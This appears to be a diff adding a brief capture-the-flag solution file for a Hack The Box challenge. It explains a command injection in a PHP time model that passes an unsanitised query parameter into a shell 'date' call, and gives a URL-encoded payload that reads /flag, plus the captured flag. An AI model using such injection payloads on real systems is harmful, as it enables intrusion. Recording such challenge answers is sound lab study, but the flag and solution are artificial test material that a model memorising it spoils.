@@ -1,0 +1,16 @@
+HTB{f4k3_fl4g_f0r_t35t1ng}
+
+
+
+
+Solved.
+
+Vulnerability is command injection in models/TimeModel.php:
+
+It builds shell command: date '+$format' 2>&1
+format comes straight from $_GET without sanitization.
+Exploit payload:
+/?format=%27;%20cat%20/flag;%20%23
+
+Flag:
+HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_434c05618439e8a7af17fad8bd8959de}
